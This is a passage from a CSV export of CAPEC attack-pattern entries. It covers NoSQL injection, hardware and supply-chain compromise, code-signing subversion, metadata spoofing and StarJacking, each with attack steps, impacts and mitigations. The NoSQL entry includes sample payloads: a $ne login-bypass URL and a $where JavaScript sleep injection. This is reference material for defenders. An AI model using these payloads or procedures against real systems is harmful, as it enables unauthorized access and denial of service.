inject characters or keywords that have special meaning in the given NoSQL database or language (e.g., $ne for MongoDB or $exists for PHP/MongoDB), or JavaScript that can be executed within the application. The goal is to create a NoSQL query with an invalid syntax.:TECHNIQUE:Use web browser to inject input through text fields or through HTTP GET parameters.:TECHNIQUE:Use a web application debugging tool such as Tamper Data, TamperIE, WebScarab,etc. to modify HTTP POST parameters, hidden fields, non-freeform fields, etc.:TECHNIQUE:Use network-level packet injection tools such as netcat to inject input:TECHNIQUE:Use modified client (modified by reverse engineering) to inject input.::STEP:3:PHASE:Experiment:DESCRIPTION:[Experiment with NoSQL Injection vulnerabilities] After determining that a given input is vulnerable to NoSQL Injection, hypothesize what the underlying query looks like. Iteratively try to add logic to the query to extract information from the database, modify/delete information in the database, or execute commands on the server.:TECHNIQUE:Use public resources such as OWASP's Testing for NoSQL Injection [REF-668] or Null Sweep's NoSQL Injection Cheatsheet [REF-669] and try different approaches for adding logic to NoSQL queries.:TECHNIQUE:Iteratively add logic to the NoSQL query and use detailed error messages from the server to debug the query.:TECHNIQUE:Attempt an HTTP Parameter Pollution attack to replace language-specific keywords, such as where within PHP [CAPEC-460].::STEP:4:PHASE:Exploit:DESCRIPTION:[Exploit NoSQL Injection vulnerability] After refining and adding various logic to NoSQL queries, craft and execute the underlying NoSQL query that will be used to attack the target system.:TECHNIQUE:Craft and Execute underlying NoSQL query::\",\"::Awareness of the technology stack being leveraged by the target application.::NoSQL queries used by the application to store, retrieve, or modify data.::User-controllable input that is not properly validated by the application as part of NoSQL queries.::Target potentially susceptible to operator replacement attacks.::\",\"::SKILL:For keyword and JavaScript injection attacks, it is fairly simple for someone with basic NoSQL knowledge to perform NoSQL injection, once the target's technology stack has been determined.:LEVEL:Low::SKILL:For operator replacement attacks, the adversary must also have knowledge of HTTP Parameter Pollution attacks and how to conduct them.:LEVEL:Medium::\",\"::None: No specialized resources are required to execute this type of attack.::\",\"::Too many false or invalid queries to the database, especially those caused by malformed input.::Executed queries or commands that appear to malicious in nature or originating from an untrustworthy source.::\",\"::SCOPE:Integrity:TECHNICAL IMPACT:Modify Data::SCOPE:Confidentiality:TECHNICAL IMPACT:Read Data::SCOPE:Confidentiality:SCOPE:Integrity:SCOPE:Availability:TECHNICAL IMPACT:Execute Unauthorized Commands:NOTE:Run Arbitrary Code::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:Authorization:TECHNICAL IMPACT:Gain Privileges::\",\"::Strong input validation - All user-controllable input must be validated and filtered for illegal characters as well as relevant NoSQL and JavaScript content. NoSQL-specific keywords, such as $ne, $eq or $gt for MongoDB, must be filtered in addition to characters such as a single-quote(') or semicolons (;) based on the context in which they appear. Validation should also extend to expected types.::If possible, leverage safe APIs (e.g., PyMongo and Flask-PyMongo for Python and MongoDB) for queries as opposed to building queries from strings.::Ensure the most recent version of a NoSQL database and it's corresponding API are used by the application.::Use of custom error pages - Adversaries can glean information about the nature of queries from descriptive error messages. Input validation must be coupled with customized error pages that inform about an error without disclosing information about the database or application.::Exercise the principle of Least Privilege with regards to application accounts to minimize damage if a NoSQL injection attack is successful.::If using MongoDB, disable server-side JavaScript execution and leverage a sanitization module such as mongo-sanitize.::If using PHP with MongoDB, ensure all special query operators (starting with $) use single quotes to prevent operator replacement attacks.::Additional mitigations will depend on the NoSQL database, API, and programming language leveraged by the application.::\",\"::The following examples primarily cite MongoDB, PHP, and NodeJS attacks due to their prominence and popularity. However, please note that these attacks are not exclusive to this NoSQL instance, programming language, or runtime framework. Within NodeJS, Login Bypass attacks are possible via MongoDB if user-input is not properly validated and sanitized [REF-670]. //NodeJS with Express.jsdb.collection('users').find({user: req.query.user,password: req.query.password}); The above code works fine if the user were to submit a query like the following: https://example.org/login?user=patrick&password=1234 But an adversary could submit a malicious query such as the below, which would be interpreted by the code as follows: https://example.org/login?user=patrick&password[$ne]= //NodeJS with Express.jsdb.collection('users').find({user: bob,password: {&ne: }}); This will result in a Login Bypass attack, as the query will succeed for all values where Bob's password is not an empty string.::MongoDB instances are also vulnerable to JavaScript Injection Attacks when user input is not properly validated and sanitized. //PHP with MongoDBdb.collection.find({$where: function() {return (this.username == $username) } } ); If the user properly specifies a username, then this code will execute as intended. However, an adversary can inject JavaScript into the $username variable to achieve a NoSQL Injection attack as follows: //PHP with MongoDBdb.collection.find({$where: function() {return (this.username == 'foo'; sleep(5000) ) } } ); This will result in the server sleeping for 5 seconds if the attack was successful. An adversary could supply a larger value to deny service to the application.::If leveraging PHP with MongoDB, operator replacement attacks are possible if special query operators are not properly addressed. The below example from OWASP's Test for NoSQL Injection displays a simple case of how this could occur.[REF-668] db.myCollection.find({$where: function() {return obj.credits - obj.debits < 0; } } ); Even though the above query does not depend on any user input, it is vulnerable to a NoSQL injection attack via operator replacement on the $where keyword. In this case, the adversary could exploit MongoDB in the following manner: $where: function() { //arbitrary JavaScript here }::\",\"::943::1286::\",\"\",\"\",\n677,\"Server Motherboard Compromise\",Detailed,Draft,\"Malware is inserted in a server motherboard (e.g., in the flash memory) in order to alter server functionality from that intended. The development environment or hardware/software support activity environment is susceptible to an adversary inserting malicious software into hardware components during development or update.\",\"\",Low,High,\"::NATURE:ChildOf:CAPEC ID:534::\",\"\",\"::An adversary with access to hardware/software processes and tools within the development or hardware/software support environment can insert malicious software into hardware components during development or update/maintenance.::\",\"\",\"\",\"\",\"::SCOPE:Integrity:TECHNICAL IMPACT:Execute Unauthorized Commands::\",\"::Purchase IT systems, components and parts from government approved vendors whenever possible.::Establish diversity among suppliers.::Conduct rigorous threat assessments of suppliers.::Require that Bills of Material (BoM) for critical parts and components be certified.::Utilize contract language requiring contractors and subcontractors to flow down to subcontractors and suppliers SCRM and SCRA (Supply Chain Risk Assessment) requirements.::Establish trusted supplier networks.::\",\"::Malware is inserted into the Unified Extensible Firmware Interface (UEFI) software that resides on a flash memory chip soldered to a computer’s motherboard. It is the first thing to turn on when a system is booted and is allowed access to almost every part of the operating system. Hence, the malware will have extensive control over operating system functions and persist after system reboots. [REF-685]::\",\"\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1195.003:ENTRY NAME:Supply Chain Compromise: Compromise Hardware Supply Chain::\",\"\",\n678,\"System Build Data Maliciously Altered\",Detailed,Draft,\"During the system build process, the system is deliberately misconfigured by the alteration of the build data. Access to system configuration data files and build processes is susceptible to deliberate misconfiguration of the system.\",\"\",Low,High,\"::NATURE:ChildOf:CAPEC ID:444::\",\"\",\"::An adversary has access to the data files and processes used for executing system configuration and performing the build.::\",\"\",\"\",\"\",\"::SCOPE:Integrity:TECHNICAL IMPACT:Execute Unauthorized Commands::SCOPE:Access Control:TECHNICAL IMPACT:Gain Privileges::SCOPE:Confidentiality:TECHNICAL IMPACT:Modify Data:TECHNICAL IMPACT:Read Data::\",\"::Implement configuration management security practices that protect the integrity of software and associated data.::Monitor and control access to the configuration management system.::Harden centralized repositories against attack.::Establish acceptance criteria for configuration management check-in to assure integrity.::Plan for and audit the security of configuration management administration processes.::Maintain configuration control over operational systems.::\",\"::‘Make’ is a program used for building executable programs and libraries from source code by executing commands and following rules in a ‘makefile’. It can create a malicious executable if commands or dependency paths in the makefile are maliciously altered to execute an unwanted command or reference as a dependency maliciously altered code.::\",\"\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1195.002:ENTRY NAME:Supply Chain Compromise: Compromise Software Supply Chain::\",\"\",\n679,\"Exploitation of Improperly Configured or Implemented Memory Protections\",Detailed,Draft,\"An adversary takes advantage of missing or incorrectly configured access control within memory to read/write data or inject malicious code into said memory.\",\"\",Medium,Very High,\"::NATURE:ChildOf:CAPEC ID:1::NATURE:ChildOf:CAPEC ID:180::\",\"\",\"::Access to the hardware being leveraged.::\",\"::SKILL:Ability to craft malicious code to inject into the memory region.:LEVEL:Medium::SKILL:Intricate knowledge of memory structures.:LEVEL:High::\",\"\",\"\",\"::SCOPE:Integrity:TECHNICAL IMPACT:Modify Data::SCOPE:Confidentiality:TECHNICAL IMPACT:Read Data::SCOPE:Confidentiality:SCOPE:Integrity:SCOPE:Availability:TECHNICAL IMPACT:Execute Unauthorized Commands:NOTE:Run Arbitrary Code::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:Authorization:TECHNICAL IMPACT:Gain Privileges::\",\"::Ensure that protected and unprotected memory ranges are isolated and do not overlap.::If memory regions must overlap, leverage memory priority schemes if memory regions can overlap.::Ensure that original and mirrored memory regions apply the same protections.::Ensure immutable code or data is programmed into ROM or write-once memory.::\",\"::A hardware product contains non-volatile memory, which itself contains boot code that is insufficiently protected. An adversary then modifies this memory to either bypass the secure boot process or to execute their own code.::A hardware product leverages a CPU that does not possess a memory-protection unit (MPU) and a memory-management unit (MMU) nor a special bit to support write exclusivity, resulting in no write exclusivity. Because of this, an adversary is able to inject malicious code into the memory and later execute it to achieve the desired outcome.::\",\"::1222::1252::1257::1260::1274::1282::1312::1316::1326::\",\"\",\"\",\n68,\"Subvert Code-signing Facilities\",Standard,Draft,\"Many languages use code signing facilities to vouch for code's identity and to thus tie code to its assigned privileges within an environment. Subverting this mechanism can be instrumental in an attacker escalating privilege. Any means of subverting the way that a virtual machine enforces code signing classifies for this style of attack.\",\"\",Low,Very High,\"::NATURE:ChildOf:CAPEC ID:233::\",\"\",\"::A framework-based language that supports code signing (such as, and most commonly, Java or .NET)::Deployed code that has been signed by its authoring vendor, or a partner.::The attacker will, for most circumstances, also need to be able to place code in the victim container. This does not necessarily mean that they will have to subvert host-level security, except when explicitly indicated.::\",\"::SKILL:Subverting code signing is not a trivial activity. Most code signing and verification schemes are based on use of cryptography and the attacker needs to have an understanding of these cryptographic operations in good detail. Additionally the attacker also needs to be aware of the way memory is assigned and accessed by the container since, often, the only way to subvert code signing would be to patch the code in memory. Finally, a knowledge of the platform specific mechanisms of signing and verifying code is a must.:LEVEL:High::\",\"::The Attacker needs no special resources beyond the listed prerequisites in order to conduct this style of attack.::\",\"\",\"::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:Authorization:TECHNICAL IMPACT:Gain Privileges::\",\"::A given code signing scheme may be fallible due to improper use of cryptography. Developers must never roll out their own cryptography, nor should existing primitives be modified or ignored.::If an attacker cannot attack the scheme directly, they might try to alter the environment that affects the signing and verification processes. A possible mitigation is to avoid reliance on flags or environment variables that are user-controllable.::\",\"::In old versions (prior to 3.0b4) of the Netscape web browser Attackers able to foist a malicious Applet into a client's browser could execute the Magic Coat attack. In this attack, the offending Applet would implement its own getSigners() method. This implementation would use the containing VM's APIs to acquire other Applet's signatures (by calling _their_ getSigners() method) and if any running Applet had privileged-enough signature, the malicious Applet would have inherited that privilege just be (metaphorically) donning the others' coats.::Some (older) web browsers allowed scripting languages, such as JavaScript, to call signed Java code. In these circumstances, the browser's VM implementation would choose not to conduct stack inspection across language boundaries (from called signed Java to calling JavaScript) and would short-circuit true at the language boundary. Doing so meant that the VM would allow any (unprivileged) script to call privileged functions within signed code with impunity, causing them to fall prey to luring attacks.::The ability to load unsigned code into the kernel of earlier versions of Vista and bypass integrity checking is an example of such subversion. In the proof-of-concept, it is possible to bypass the signature-checking mechanism Vista uses to load device drivers.::\",\"::325::328::1326::\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1553.002:ENTRY NAME:Subvert Trust Controls: Code Signing::\",\"\",\n680,\"Exploitation of Improperly Controlled Registers\",Detailed,Draft,\"An adversary exploits missing or incorrectly configured access control within registers to read/write data that is not meant to be obtained or modified by a user.\",\"\",Medium,High,\"::NATURE:ChildOf:CAPEC ID:1::NATURE:ChildOf:CAPEC ID:180::\",\"\",\"::Awareness of the hardware being leveraged.::Access to the hardware being leveraged.::\",\"::SKILL:Intricate knowledge of registers.:LEVEL:High::\",\"\",\"\",\"::SCOPE:Integrity:TECHNICAL IMPACT:Modify Data::SCOPE:Confidentiality:TECHNICAL IMPACT:Read Data::\",\"::Design proper access control policies for hardware register access from software and ensure these policies are implemented in accordance with the specified design.::Ensure security lock bit protections are reviewed for design inconsistencies and common weaknesses.::Test security lock programming flow in both pre-silicon and post-silicon environments.::Leverage automated tools to test that values are not reprogrammable and that write-once fields lock on writing zeros.::Ensure that measurement data is stored in registers that are read-only or otherwise have access controls that prevent modification by an untrusted agent.::\",\"::During a System-on-Chip's (SoC) secure boot process, the code to be authenticated is measured to determine the code's validity. This entails the one-way hash of the code binary being calculated and extended to the previous hash. The value obtained after completion of the boot flow is then stored in a register with the intent of later verifying this value to determine if the boot flow has been tampered with. However, the register being used does not prevent an adversary from modifying the register's contents, which can result in the adversary spoofing the measurement data used in the attestation process.::\",\"::1224::1231::1233::1262::1283::\",\"\",\"\",\n681,\"Exploitation of Improperly Controlled Hardware Security Identifiers\",Detailed,Draft,\"An adversary takes advantage of missing or incorrectly configured security identifiers (e.g., tokens), which are used for access control within a System-on-Chip (SoC), to read/write data or execute a given action.\",\"\",Medium,Very High,\"::NATURE:ChildOf:CAPEC ID:1::NATURE:ChildOf:CAPEC ID:180::\",\"\",\"::Awareness of the hardware being leveraged.::Access to the hardware being leveraged.::\",\"::SKILL:Ability to execute actions within the SoC.:LEVEL:Medium::SKILL:Intricate knowledge of the identifiers being utilized.:LEVEL:High::\",\"\",\"\",\"::SCOPE:Integrity:TECHNICAL IMPACT:Modify Data::SCOPE:Confidentiality:TECHNICAL IMPACT:Read Data::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:Authorization:TECHNICAL IMPACT:Gain Privileges::\",\"::Review generation of security identifiers for design inconsistencies and common weaknesses.::Review security identifier decoders for design inconsistencies and common weaknesses.::Test security identifier definition, access, and programming flow in both pre-silicon and post-silicon environments.::\",\"::A system contains a register (divided into four 32-bit registers) that is used to store a 128-bit AES key for encryption/decryption, in addition to an access-policy register. The access-policy register determines which agents may access the AES-key registers, based on a corresponding security identifier. It is assumed the system has two agents: a Main-controller and an Aux-controller, with respective security identifiers 1 and 2. The Main-controller (ID 1) is meant to have access to the AES-key registers, while the Aux-controller (ID 2) has access to the access-policy register. If a SoC incorrectly generates security identifier 1 for both agents, then both agents will have access to the AES-key registers. This could further result in a Denial-of-Service (DoS) or the execution of an action that in turn could result in privilege escalation or unintended access.::\",\"::1259::1267::1270::1294::1302::\",\"\",\"\",\n682,\"Exploitation of Firmware or ROM Code with Unpatchable Vulnerabilities\",Standard,Draft,\"An adversary may exploit vulnerable code (i.e., firmware or ROM) that is unpatchable. Unpatchable devices exist due to manufacturers intentionally or inadvertently designing devices incapable of updating their software. Additionally, with updatable devices, the manufacturer may decide not to support the device and stop making updates to their software.\",\"\",Medium,High,\"::NATURE:ChildOf:CAPEC ID:212::\",\"::STEP:1:PHASE:Explore:DESCRIPTION:[Determine vulnerable firmware or ROM code] An adversary will attempt to find device models that are known to have unpatchable firmware or ROM code, or are deemed “end-of-support” where a patch will not be made. The adversary looks for vulnerabilities in firmware or ROM code for the identified devices, or looks for devices which have known vulnerabilities:TECHNIQUE:Many botnets use wireless scanning to discover nearby devices that might have default credentials or commonly used passwords. Once these devices are infected, they can search for other nearby devices and so on.::STEP:2:PHASE:Experiment:DESCRIPTION:[Determine plan of attack] An adversary identifies a specific device/model that they wish to attack. They will also investigate similar devices to determine if the vulnerable firmware or ROM code is also present.::STEP:3:PHASE:Exploit:DESCRIPTION:[Carry out attack] An adversary exploits the vulnerable firmware or ROM code on the identified device(s) to achieve their desired goal.:TECHNIQUE:Install malware on a device to recruit it for a botnet.:TECHNIQUE:Install malware on the device and use it for a ransomware attack.:TECHNIQUE:Gain root access and steal information stored on the device.:TECHNIQUE:Manipulate the device to behave in unexpected ways which would benefit the adversary.::\",\"::Awareness of the hardware being leveraged.::Access to the hardware being leveraged, either physically or remotely.::\",\"::SKILL:Knowledge of various wireless protocols to enable remote access to vulnerable devices:LEVEL:Medium::SKILL:Ability to identify physical entry points such as debug interfaces if the device is not being accessed remotely:LEVEL:High::\",\"\",\"\",\"::SCOPE:Integrity:TECHNICAL IMPACT:Modify Data::SCOPE:Confidentiality:TECHNICAL IMPACT:Read Data::SCOPE:Access Control:SCOPE:Authorization:TECHNICAL IMPACT:Gain Privileges::\",\"::Design systems and products with the ability to patch firmware or ROM code after deployment to fix vulnerabilities.::Make use of OTA (Over-the-air) updates so that firmware can be patched remotely either through manual or automatic means::\",\"::An IoT company comes out with a line of smart products for home use such as home cameras, vacuums, and smart bulbs. The products become popular, and millions of consumers install these devices in their homes. All the devices use a custom module for encryption that is stored on a ROM chip, which is immutable memory and can't be changed. An adversary discovers that there is a vulnerability in the encryption module code that allows authentication bypass, gaining access to any device. The adversary then develops botnet code that is remotely downloaded onto the infected devices. This code scans the internet for nearby devices from the same product line and exploits the vulnerability, loading the botnet code onto these new devices. Over time, the adversary now has a botnet of devices that can carry out malicious activity such as a DDoS attacks. Once the vulnerability is found, it is impossible to remediate because the vulnerable code is unable to be updated.::Older smartphones can become out of date and manufacturers may stop putting out security updates as they focus on newer models. If an adversary discovers a vulnerability in an old smartphone there is a chance that a security update will not be made to mitigate it. This leaves anyone using the old smartphone vulnerable.::\",\"::1277::1310::\",\"\",\"\",\n69,\"Target Programs with Elevated Privileges\",Standard,Draft,\"This attack targets programs running with elevated privileges. The adversary tries to leverage a vulnerability in the running program and get arbitrary code to execute with elevated privileges.\",\"\",High,Very High,\"::NATURE:ChildOf:CAPEC ID:233::NATURE:CanPrecede:CAPEC ID:8::NATURE:CanPrecede:CAPEC ID:9::NATURE:CanPrecede:CAPEC ID:10::NATURE:CanPrecede:CAPEC ID:67::\",\"::STEP:1:PHASE:Explore:DESCRIPTION:[Find programs with elevated priveleges] The adversary probes for programs running with elevated privileges.:TECHNIQUE:Look for programs that write to the system directories or registry keys (such as HKLM, which stores a number of critical Windows environment variables). These programs are typically running with elevated privileges and have usually not been designed with security in mind. Such programs are excellent exploit targets because they yield lots of power when they break.::STEP:2:PHASE:Explore:DESCRIPTION:[Find vulnerability in running program] The adversary looks for a vulnerability in the running program that would allow for arbitrary code execution with the privilege of the running program.:TECHNIQUE:Look for improper input validation:TECHNIQUE:Look for improper failure safety. For instance when a program fails it may authorize restricted access to anyone.:TECHNIQUE:Look for a buffer overflow which may be exploited if an adversary can inject unvalidated data.::STEP:3:PHASE:Exploit:DESCRIPTION:[Execute arbitrary code] The adversary exploits the vulnerability that they have found. For instance, they can try to inject and execute arbitrary code or write to OS resources.::\",\"::The targeted program runs with elevated OS privileges.::The targeted program accepts input data from the user or from another program.::The targeted program is giving away information about itself. Before performing such attack, an eventual attacker may need to gather information about the services running on the host target. The more the host target is verbose about the services that are running (version number of application, etc.) the more information can be gather by an attacker.::This attack often requires communicating with the host target services directly. For instance Telnet may be enough to communicate with the host target.::\",\"::SKILL:An attacker can use a tool to scan and automatically launch an attack against known issues. A tool can also repeat a sequence of instructions and try to brute force the service on the host target, an example of that would be the flooding technique.:LEVEL:Low::SKILL:More advanced attack may require knowledge of the protocol spoken by the host service.:LEVEL:Medium::\",\"\",\"::The log can have a trace of abnormal activity. Also if abnormal activity is detected on the host target. For instance flooding should be seen as abnormal activity and the target host may decide to take appropriate action in order to mitigate the attack (data filtering or blocking). Resource exhaustion is also a sign of abnormal activity.::\",\"::SCOPE:Confidentiality:SCOPE:Integrity:SCOPE:Availability:TECHNICAL IMPACT:Execute Unauthorized Commands:NOTE:Run Arbitrary Code::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:Authorization:TECHNICAL IMPACT:Gain Privileges::SCOPE:Availability:TECHNICAL IMPACT:Resource Consumption:NOTE:Denial of Service::\",\"::Apply the principle of least privilege.::Validate all untrusted data.::Apply the latest patches.::Scan your services and disable the ones which are not needed and are exposed unnecessarily. Exposing programs increases the attack surface. Only expose the services which are needed and have security mechanisms such as authentication built around them.::Avoid revealing information about your system (e.g., version of the program) to anonymous users.::Make sure that your program or service fail safely. What happen if the communication protocol is interrupted suddenly? What happen if a parameter is missing? Does your system have resistance and resilience to attack? Fail safely when a resource exhaustion occurs.::If possible use a sandbox model which limits the actions that programs can take. A sandbox restricts a program to a set of privileges and commands that make it difficult or impossible for the program to cause any damage.::Check your program for buffer overflow and format String vulnerabilities which can lead to execution of malicious code.::Monitor traffic and resource usage and pay attention if resource exhaustion occurs.::Protect your log file from unauthorized modification and log forging.::\",\"\",\"::250::15::\",\"\",\"\",\n690,\"Metadata Spoofing\",Meta,Stable,\"An adversary alters the metadata of a resource (e.g., file, directory, repository, etc.) to present a malicious resource as legitimate/credible.\",\"\",Medium,High,\"\",\"\",\"::Identification of a resource whose metadata is to be spoofed::\",\"::SKILL:Ability to spoof a variety of metadata to convince victims the source is trusted:LEVEL:Medium::\",\"\",\"\",\"::SCOPE:Integrity:TECHNICAL IMPACT:Modify Data::SCOPE:Accountability:TECHNICAL IMPACT:Hide Activities::SCOPE:Access Control:SCOPE:Authorization:TECHNICAL IMPACT:Execute Unauthorized Commands::\",\"::Validate metadata of resources such as authors, timestamps, and statistics.::Confirm the pedigree of open source packages and ensure the code being downloaded does not originate from another source.::Even if the metadata is properly checked and a user believes it to be legitimate, there may still be a chance that they've been duped. Therefore, leverage automated testing techniques to determine where malicious areas of the code may exist.::\",\"\",\"\",\"\",\"\",\n691,\"Spoof Open-Source Software Metadata\",Standard,Stable,\"An adversary spoofs open-source software metadata in an attempt to masquerade malicious software as popular, maintained, and trusted.\",\"\",Medium,High,\"::NATURE:ChildOf:CAPEC ID:690::NATURE:CanPrecede:CAPEC ID:184::NATURE:CanPrecede:CAPEC ID:444::NATURE:PeerOf:CAPEC ID:630::\",\"\",\"::Identification of a popular open-source component whose metadata is to be spoofed.::\",\"::SKILL:Ability to spoof a variety of software metadata to convince victims the source is trusted.:LEVEL:Medium::\",\"\",\"\",\"::SCOPE:Integrity:TECHNICAL IMPACT:Modify Data::SCOPE:Accountability:TECHNICAL IMPACT:Hide Activities::SCOPE:Access Control:SCOPE:Authorization:TECHNICAL IMPACT:Execute Unauthorized Commands:TECHNICAL IMPACT:Alter Execution Logic:TECHNICAL IMPACT:Gain Privileges::\",\"::Before downloading open-source software, perform precursory metadata checks to determine the author(s), frequency of updates, when the software was last updated, and if the software is widely leveraged.::Within package managers, look for conflicting or non-unique repository references to determine if multiple packages share the same repository reference.::Reference vulnerability databases to determine if the software contains known vulnerabilities.::Only download open-source software from reputable hosting sites or package managers.::Only download open-source software that has been adequately signed by the developer(s). For repository commits/tags, look for the Verified status and for developers leveraging Vigilant Mode (GitHub) or similar modes.::After downloading open-source software, ensure integrity values have not changed.::Before executing or incorporating the software, leverage automated testing techniques (e.g., static and dynamic analysis) to determine if the software behaves maliciously.::\",\"::An adversary provides a malicious open-source library, claiming to provide extended logging features and functionality, and spoofs the metadata with that of a widely used legitimate library. The adversary then tricks victims into including this library in their underlying application. Once the malicious software is incorporated into the application, the adversary is able to manipulate and exfiltrate log data.::\",\"::494::\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1195.001:ENTRY NAME:Supply Chain Compromise: Compromise Software Dependencies and Development Tools::::TAXONOMY NAME:ATTACK:ENTRY ID:1195.002:ENTRY NAME:Supply Chain Compromise: Compromise Software Supply Chain::\",\"\",\n692,\"Spoof Version Control System Commit Metadata\",Detailed,Stable,\"An adversary spoofs metadata pertaining to a Version Control System (VCS) (e.g., Git) repository's commits to deceive users into believing that the maliciously provided software is frequently maintained and originates from a trusted source.\",\"\",Medium,High,\"::NATURE:ChildOf:CAPEC ID:691::\",\"::STEP:1:PHASE:Explore:DESCRIPTION:[Identify target] The adversary must first identify a target repository for them to spoof. Typically, this will be a popular and widely used repository, as to increase the amount of victims a successful attack will exploit.::STEP:2:PHASE:Experiment:DESCRIPTION:[Create malicious repository] The adversary must create a malicious repository that imitates the legitimate repository being spoofed. This may include creating a username that closely matches the legitimate repository owner; creating a repository name that closely matches the legitimate repository name; uploading the legitimate source code; and more.::STEP:3:PHASE:Experiment:DESCRIPTION:[Spoof commit metadata] Once the malicious repository has been created, the adversary must then spoof the commit metadata to make the repository appear to be frequently maintained and originating from trusted sources.:TECHNIQUE:Git Commit Timestamps: The adversary generates numerous fake commits while setting the GIT_AUTHOR_DATE and GIT_COMMITTER_DATE environment variables to a date which is to be spoofed.:TECHNIQUE:Git Commit Contributors: The adversary obtains a legitimate and trusted user's email address and then sets this information via the git config command. The adversary can then commit changes leveraging this username.::STEP:4:PHASE:Exploit:DESCRIPTION:[Exploit victims] The adversary infiltrates software and/or system environments with the goal of conducting additional attacks.:TECHNIQUE:Active: The adversary attempts to trick victims into downloading the malicious software by means such as phishing and social engineering.:TECHNIQUE:Passive: The adversary waits for victims to download and leverage malicious software.::\",\"::Identification of a popular open-source repository whose metadata is to be spoofed.::\",\"::SKILL:Ability to spoof a variety of repository metadata to convince victims the source is trusted.:LEVEL:Medium::\",\"\",\"\",\"::SCOPE:Integrity:TECHNICAL IMPACT:Modify Data::SCOPE:Accountability:TECHNICAL IMPACT:Hide Activities::SCOPE:Access Control:SCOPE:Authorization:TECHNICAL IMPACT:Execute Unauthorized Commands:TECHNICAL IMPACT:Alter Execution Logic:TECHNICAL IMPACT:Gain Privileges::\",\"::Before downloading open-source software, perform precursory metadata checks to determine the author(s), frequency of updates, when the software was last updated, and if the software is widely leveraged.::Reference vulnerability databases to determine if the software contains known vulnerabilities.::Only download open-source software from reputable hosting sites or package managers.::Only download open-source software that has been adequately signed by the developer(s). For repository commits/tags, look for the Verified status and for developers leveraging Vigilant Mode (GitHub) or similar modes.::After downloading open-source software, ensure integrity values have not changed.::Before executing or incorporating the software, leverage automated testing techniques (e.g., static and dynamic analysis) to determine if the software behaves maliciously.::\",\"::In July 2022, Checkmarx reported that GitHub commit metadata could be spoofed if unsigned commits were leveraged by the repository. Adversaries were able to spoof commit contributors, as well as the date/time of the commit. This resulted in commits appearing to originate from trusted developers and a GitHub activity graph that duped users into believing that the repository had been maintained for a significant period of time. The lack of commit metadata validation ultimately allowed adversaries to propagate malware to unsuspecting victims [REF-719] [REF-720].::\",\"::494::\",\"\",\"\",\n693,\"StarJacking\",Detailed,Stable,\"An adversary spoofs software popularity metadata to deceive users into believing that a maliciously provided package is widely used and originates from a trusted source.\",\"\",Medium,High,\"::NATURE:ChildOf:CAPEC ID:691::\",\"::STEP:1:PHASE:Explore:DESCRIPTION:[Identify target] The adversary must first identify a target package whose popularity statistics will be leveraged. This will be a popular and widely used package, as to increase the perceived pedigree of the malicious package.::STEP:2:PHASE:Experiment:DESCRIPTION:[Spoof package popularity] The adversary provides their malicious package to a package manager and uses the source code repository URL identified in Step 1 to spoof the popularity of the package. This malicious package may also closely resemble the legitimate package whose statistics are being utilized.::STEP:3:PHASE:Exploit:DESCRIPTION:[Exploit victims] The adversary infiltrates development environments with the goal of conducting additional attacks.:TECHNIQUE:Active: The adversary attempts to trick victims into downloading the malicious package by means such as phishing and social engineering.:TECHNIQUE:Passive: The adversary waits for victims to download and leverage the malicious package.::\",\"::Identification of a popular open-source package whose popularity metadata is to be used for the malicious package.::\",\"::SKILL:Ability to provide a package to a package manager and associate a popular package's source code repository URL.:LEVEL:Low::\",\"\",\"\",\"::SCOPE:Integrity:TECHNICAL IMPACT:Modify Data::SCOPE:Accountability:TECHNICAL IMPACT:Hide Activities::SCOPE:Access Control:SCOPE:Authorization:TECHNICAL IMPACT:Execute Unauthorized Commands:TECHNICAL IMPACT:Alter Execution Logic:TECHNICAL IMPACT:Gain Privileges::\",\"::Before downloading open-source packages, perform precursory metadata checks to determine the author(s), frequency of updates, when the software was last updated, and if the software is widely leveraged.::Look for conflicting or non-unique repository references to determine if multiple packages share the same repository reference.::Reference vulnerability databases to determine if the software contains known vulnerabilities.::Only download open-source packages from reputable package managers.::After downloading open-source packages, ensure integrity values have not changed.::Before executing or incorporating the package, leverage automated testing techniques (e.g., static and dynamic analysis) to determine if the software behaves maliciously.::\",\"::In April 2022, Checkmarx reported that packages hosted on NPM, PyPi, and Yarn do not properly validate that the provided GitHub repository URL actually pertains to the package being provided. Combined with additional attacks such as TypoSquatting, this allows adversaries to spoof popularity metadata by associating popular GitHub repository URLs with the malicious package. This can further lead to developers unintentionally including the malicious package within their development environments [REF-721].::\",\"::494::\",\"\",\"\",\n694,\"System Location Discovery\",Standard,Stable,\"An adversary collects information about the target system in an attempt to identify the system's geographical location. Information gathered could include keyboard layout, system language, and timezone. This information may benefit an adversary in confirming the desired target and/or tailoring further attacks.\",\"\",High,Very Low,\"::NATURE:ChildOf:CAPEC ID:169::\",\"::STEP:1:PHASE:Explore:DESCRIPTION:[System Locale Information Discovery] The adversary examines system information from various sources such as registry and native API functions and correlates the gathered information to infer the geographical location of the target system:TECHNIQUE:Registry Query: Query the registry key HKEY_LOCAL_MACHINESYSTEMCurrentControlSetControlContentIndexLanguageLanguage_Dialect on Windows to obtain system language, ComputerHKEY_CURRENT_USERKeyboard LayoutPreload to obtain the hexadecimal language IDs of the current user's preloaded keyboard layouts, and ComputerHKEY_LOCAL_MACHINESYSTEMCurrentControlSetControlTimeZoneInformation to obtain the system timezone configuration:TECHNIQUE:Native API Requests: Parse the outputs of Windows API functions GetTimeZoneInformation, GetUserDefaultUILanguage, GetSystemDefaultUILanguage, GetKeyboardLayoutList and GetUserDefaultLangID to obtain information about languages, keyboard layouts, and timezones installed on the system or on macOS or Linux systems, query locale to obtain the $LANG environment variable and view keyboard layout information or use timeanddatectl status to show the system clock settings.:TECHNIQUE:Read Configuration Files: For macOS and Linux-based systems, view the /etc/vconsole.conf file to get information about the keyboard mapping and console font.::\",\"::The adversary must have some level of access to the system and have a basic understanding of the operating system in order to query the appropriate sources for relevant information.::\",\"::SKILL:The adversary must know how to query various system sources of information respective of the system's operating system to obtain the relevant information.:LEVEL:Low::\",\"::The adversary requires access to the target's operating system tools to query relevant system information. On windows, registry queries can be conducted with powershell, wmi, or regedit. On Linux or macOS, queries can be performed with through a 